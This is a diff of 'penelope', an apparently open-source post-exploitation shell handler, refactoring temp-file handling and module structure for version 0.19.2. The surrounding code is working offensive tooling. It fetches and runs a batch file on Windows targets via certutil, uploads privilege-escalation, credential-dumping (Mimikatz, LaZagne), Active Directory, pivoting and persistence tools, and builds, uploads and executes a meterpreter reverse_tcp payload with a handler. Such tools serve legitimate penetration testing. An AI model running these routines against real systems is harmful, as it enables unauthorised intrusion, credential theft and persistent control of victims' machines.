@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.19.1"
+__version__ = "0.19.2"
 
 import os
 import io
@@ -38,6 +38,7 @@ import tarfile
 import logging
 import zipfile
 import inspect
+import tempfile
 import warnings
 import platform
 import itertools
@@ -3494,29 +3495,42 @@ class Session:
 					logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")
 
 		elif self.OS == 'Windows':
-			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
-			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
-			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
-			cmd = (
-				f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
-				' -DestinationPath $archivepath;'
-				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
-				'Remove-Item $archivepath;'
-				'Write-Host $b64"'
-			)
-			with open(tempfile_bat, "w") as f:
-				f.write(cmd)
 
-			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
-			urlpath_bat = server.add(tempfile_bat)
-			temp_remote_file_bat = urlpath_bat.split("/")[-1]
-			server.start()
-			data = self.exec(
-				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
-				f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
-				f'del "%TEMP%\\{temp_remote_file_bat}"',
-				force_cmd=True, value=True, timeout=None)
-			server.stop()
+			with ExitStack() as stack:
+				remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
+
+				remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
+				cmd = (
+					f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
+					' -DestinationPath $archivepath;'
+					'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
+					'Remove-Item $archivepath;'
+					'Write-Host $b64"'
+				)
+
+				with tempfile.NamedTemporaryFile("w", suffix=".bat", delete=False) as f:
+					f.write(cmd)
+					tempfile_bat = f.name
+
+				stack.callback(lambda p=tempfile_bat: os.path.exists(p) and os.remove(p))
+
+				server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
+				urlpath_bat = server.add(tempfile_bat)
+				temp_remote_file_bat = urlpath_bat.split("/")[-1]
+
+				server.start()
+				stack.callback(lambda: server.term.wait(options.short_timeout))
+				stack.callback(lambda: server.stop())
+				server.init.wait(options.short_timeout)
+
+				data = self.exec(
+					f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
+					f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
+					f'del "%TEMP%\\{temp_remote_file_bat}"',
+					force_cmd=True,
+					value=True,
+					timeout=None
+				)
 
 			if not data:
 				return []
@@ -3748,9 +3762,14 @@ class Session:
 				if not hasattr(server, 'id'):
 					return []
 
-				tempfile_zip = f'/dev/shm/{rand(16)}.zip'
+				tmp_zip = tempfile.NamedTemporaryFile(suffix=".zip", delete=False)
+				tempfile_zip = tmp_zip.name
+				tmp_zip.close()
 				stack.callback(lambda p=tempfile_zip: os.path.exists(p) and os.remove(p))
-				tempfile_bat = f'/dev/shm/{rand(16)}.bat'
+
+				tmp_bat = tempfile.NamedTemporaryFile(suffix=".bat", delete=False)
+				tempfile_bat = tmp_bat.name
+				tmp_bat.close()
 				stack.callback(lambda p=tempfile_bat: os.path.exists(p) and os.remove(p))
 
 				with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
@@ -4489,7 +4508,7 @@ class upload_privesc_scripts(Module):
 
 	def run(session, args):
 		"""
-		Upload specific privesc tools {linpeas, lse, deepce, pspy || winpeas, powerup, privesccheck}, If no tool is specified, all available tools are uploaded.
+		Upload {linpeas, lse, deepce, pspy || winpeas, powerup, privesccheck}
 		Example:
 			upload_privesc_scripts winpeas
 			upload_privesc_scripts linpeas pspy64
@@ -4498,7 +4517,7 @@ class upload_privesc_scripts(Module):
 			return
 
 		requested = args.split() if args else []
-		
+
 		if session.OS == 'Unix':
 			tools = {
 				"linpeas": lambda: session.upload(URLS['linpeas']),
@@ -4510,7 +4529,7 @@ class upload_privesc_scripts(Module):
 					else logger.error("pspy: No compatible binary architecture \n")
 				)
 			}
-		
+
 		elif session.OS == 'Windows':
 			tools = {
 				"winpeas": lambda: session.upload(URLS['winpeas_any']),
@@ -4521,10 +4540,11 @@ class upload_privesc_scripts(Module):
 
 		if not requested:
 			logger.info("No tools specified, uploading all")
+			print()
 			requested = list(tools.keys())
 
 		for tool in requested:
-			
+
 			if session.OS == 'Unix' and tool in ["winpeas", "winpeas_bat", "powerup", "privesccheck"]:
 				logger.warning(f"{tool} is not available on Unix targets")
 				continue
@@ -4540,17 +4560,17 @@ class upload_privesc_scripts(Module):
 				logger.error(f"Failed to upload {tool}: {e}")
 
 
-class potato(Module):
+class upload_potato(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
 		"""
-		Upload the latest version of {GodPotato, SigmaPotato, PrintSpoofer}, If no tool is specified, all available tools are uploaded.
+		Upload {GodPotato, SigmaPotato, PrintSpoofer}
 		Example:
 			potato GodPotato
 		"""
 		if not session.write_access(session.cwd):
 			return
-		
+
 		requested = args.split() if args else []
 
 		if session.OS == "Unix":
@@ -4569,6 +4589,7 @@ class potato(Module):
 			logger.error(f"Unsupported OS: {session.OS}")
 		if not requested:
 			logger.info("No tools specified, uploading all")
+			print()
 			requested = list(tools.keys())
 
 		for tool in requested:
@@ -4675,7 +4696,7 @@ class traitor(Module):
 	category = "Privilege Escalation"
 	def run(session, args):
 		"""
-		Upload the latest version of Traitor
+		Upload Traitor
 		"""
 		if session.OS == 'Unix':
 			if session.arch == "x86_64":
@@ -4694,54 +4715,19 @@ class traitor(Module):
 
 class upload_credump_scripts(Module):
 	category = "Credential Dumping"
+
+	def upload_mimikatz(session):
+		_, archive = url_to_bytes(URLS['mimikatz'])
+		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+			target = Path(tmpdir) / "mimikatz"
+			target.mkdir(parents=True, exist_ok=True)
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(target)
+			session.upload(str(target))
+
 	def run(session, args):
 		"""
-		Upload Specific Credential Dumping tools {Mimikatz, LaZagne, Snaffler, SharpWeb} to the Windows target, If no tool is specified, all available tools are uploaded.
-		"""
-		if not session.write_access(session.cwd):
-			return
-		
-		if session.OS == 'Unix':
-			logger.error("This module runs only on Windows shells")
-		if session.OS == 'Windows':	
-			requested = [t.lower() for t in args.split()] if args else []
-
-			def upload_mimikatz():
-				import tempfile
-				_, archive = url_to_bytes(URLS['mimikatz'])
-				with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-					target = Path(tmpdir) / "mimikatz"
-					target.mkdir(parents=True, exist_ok=True)
-					with zipfile.ZipFile(io.BytesIO(archive)) as z:
-						z.extractall(target)
-						session.upload(str(target))
-
-			tools = {
-				"mimikatz": upload_mimikatz,
-				"lazagne": lambda : session.upload(URLS['lazagne']),
-				"snaffler": lambda : session.upload(URLS['snaffler']),
-				"sahrpweb": lambda : session.upload(URLS['sharpweb'])
-			}
-
-			if not requested:
-				logger.info("No tools specified, uploading all")
-				requested = list(tools.keys())
-
-			for tool in requested:
-				if tool not in tools:
-					logger.error(f"Unknown tool: {tool}")
-					continue
-				try:
-					tools[tool]()
-				except Exception as e:
-					logger.error(f"Failed to upload {tool}: {e}")			
-
-
-class upload_ad_scripts(Module):
-	category = "Active Directory"
-	def run(session, args):
-		"""
-		Upload specific AD tools {PowerView, SharpHound, GhostPack}. If no tool is specified, all available tools are uploaded.
+		Upload {Mimikatz, LaZagne, Snaffler, SharpWeb}
 		"""
 		if not session.write_access(session.cwd):
 			return
@@ -4750,34 +4736,17 @@ class upload_ad_scripts(Module):
 			logger.error("This module runs only on Windows shells")
 		if session.OS == 'Windows':
 			requested = [t.lower() for t in args.split()] if args else []
-			
-			def upload_sharphound():
-				import tempfile
-				_, archive = url_to_bytes(URLS['sharphound'])
-				with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-					target = Path(tmpdir) / "sharphound"
-					target.mkdir(parents=True, exist_ok=True)
-					with zipfile.ZipFile(io.BytesIO(archive)) as z:
-						z.extractall(target)
-						session.upload(str(target))
-			def upload_ghostpack():
-				import tempfile
-				_, archive = url_to_bytes(URLS['ghostpack'])
-				with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
-					with zipfile.ZipFile(io.BytesIO(archive)) as z:
-						z.extractall(tmpdir)
-						extracted_folder = list(Path(tmpdir).iterdir())[0]
-						renamed_folder = extracted_folder.parent / "ghostpack"
-						os.rename(extracted_folder, renamed_folder)
-						session.upload(str(renamed_folder))
+
 			tools = {
-				"powerview": lambda: session.upload(URLS['powerview']),
-				"sharphound": upload_sharphound,
-				"ghostpack": upload_ghostpack,
+				"mimikatz": __class__.upload_mimikatz,
+				"lazagne": lambda session: session.upload(URLS['lazagne']),
+				"snaffler": lambda session: session.upload(URLS['snaffler']),
+				"sahrpweb": lambda session: session.upload(URLS['sharpweb'])
 			}
 
 			if not requested:
 				logger.info("No tools specified, uploading all")
+				print()
 				requested = list(tools.keys())
 
 			for tool in requested:
@@ -4785,10 +4754,64 @@ class upload_ad_scripts(Module):
 					logger.error(f"Unknown tool: {tool}")
 					continue
 				try:
-					tools[tool]()
+					tools[tool](session)
 				except Exception as e:
 					logger.error(f"Failed to upload {tool}: {e}")
 
+
+class upload_ad_scripts(Module):
+	category = "Active Directory"
+
+	def upload_sharphound(session):
+		_, archive = url_to_bytes(URLS['sharphound'])
+		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+			target = Path(tmpdir) / "sharphound"
+			target.mkdir(parents=True, exist_ok=True)
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(target)
+			session.upload(str(target))
+
+	def upload_ghostpack(session):
+		_, archive = url_to_bytes(URLS['ghostpack'])
+		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(tmpdir)
+				extracted_folder = list(Path(tmpdir).iterdir())[0]
+				renamed_folder = extracted_folder.parent / "ghostpack"
+				os.rename(extracted_folder, renamed_folder)
+				session.upload(str(renamed_folder))
+
+	def run(session, args):
+		"""
+		Upload {PowerView, SharpHound, GhostPack}
+		"""
+		if not session.write_access(session.cwd):
+			return
+
+		if session.OS == 'Unix':
+			logger.error("This module runs only on Windows shells")
+		if session.OS == 'Windows':
+			requested = [t.lower() for t in args.split()] if args else []
+
+			tools = {
+				"powerview": lambda session: session.upload(URLS['powerview']),
+				"sharphound": __class__.upload_sharphound,
+				"ghostpack":  __class__.upload_ghostpack,
+			}
+
+			if not requested:
+				logger.info("No tools specified, uploading all")
+				print()
+				requested = list(tools.keys())
+
+			for tool in requested:
+				if tool not in tools:
+					logger.error(f"Unknown tool: {tool}")
+					continue
+				try:
+					tools[tool](session)
+				except Exception as e:
+					logger.error(f"Failed to upload {tool}: {e}")
 
 
 class uac(Module):
@@ -4847,7 +4870,7 @@ class ligolo(Module):
 	category = "Pivoting"
 	def run(session, args):
 		"""
-		Upload the latest version of Ligolo-ng agent
+		Upload Ligolo-ng agent
 		"""
 		if session.OS == 'Unix':
 			if session.arch == "x86_64":
@@ -4888,7 +4911,7 @@ class chisel(Module):
 	category = "Pivoting"
 	def run(session, args):
 		"""
-		Upload the latest version of Chisel
+		Upload Chisel
 		"""
 		if session.OS == 'Unix':
 			if session.arch == "x86_64":
@@ -4968,7 +4991,7 @@ class panix(Module):
 	category = "Persistence"
 	def run(session, args):
 		"""
-		Upload the latest version of PANIX
+		Upload PANIX
 		"""
 		if session.OS == 'Unix':
 			session.upload(URLS['panix'])
@@ -4984,33 +5007,34 @@ class meterpreter(Module):
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
 		else:
-			payload_path = f"/dev/shm/{rand(10)}.exe"
-			host = session._host
-			port = 5555
-			arch = ''
-			if session.arch == "x64-based_PC":
-				arch = 'x64/'
-			payload_creation_cmd = f"msfvenom -p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
-			logger.info("Creating payload...")
-			print(payload_creation_cmd)
-			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
+			with tempfile.NamedTemporaryFile(suffix=".exe") as f:
+				payload_path = f.name
+				print(payload_path)
+				host = session._host
+				port = 5555
+				arch = ''
+				if session.arch == "x64-based_PC":
+					arch = 'x64/'
+				payload_creation_cmd = f"msfvenom -p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+				logger.info("Creating payload...")
+				print(payload_creation_cmd)
+				result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
 
-			if result.returncode == 0:
-				logger.info("Payload created!")
-				uploaded_path = session.upload(payload_path)
-				os.remove(payload_path)
-				if uploaded_path:
-					meterpreter_handler_cmd = (
-						'msfconsole -x "use exploit/multi/handler; '
-						f'set payload windows/{arch}meterpreter/reverse_tcp; '
-						f'set LHOST {host}; set LPORT {port}; run"'
-					)
-					Open(meterpreter_handler_cmd, terminal=True)
-					logger.info("Starting handler...")
-					print(meterpreter_handler_cmd)
-					session.exec(uploaded_path[0], force_cmd=True)
-			else:
-				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
+				if result.returncode == 0:
+					logger.info("Payload created!")
+					uploaded_path = session.upload(payload_path)
+					if uploaded_path:
+						meterpreter_handler_cmd = (
+							'msfconsole -x "use exploit/multi/handler; '
+							f'set payload windows/{arch}meterpreter/reverse_tcp; '
+							f'set LHOST {host}; set LPORT {port}; run"'
+						)
+						Open(meterpreter_handler_cmd, terminal=True)
+						logger.info("Starting handler...")
+						print(meterpreter_handler_cmd)
+						session.exec(uploaded_path[0], force_cmd=True)
+				else:
+					logger.error(f"Cannot create meterpreter payload: {result.stderr}")
 
 
 class cleanup(Module):
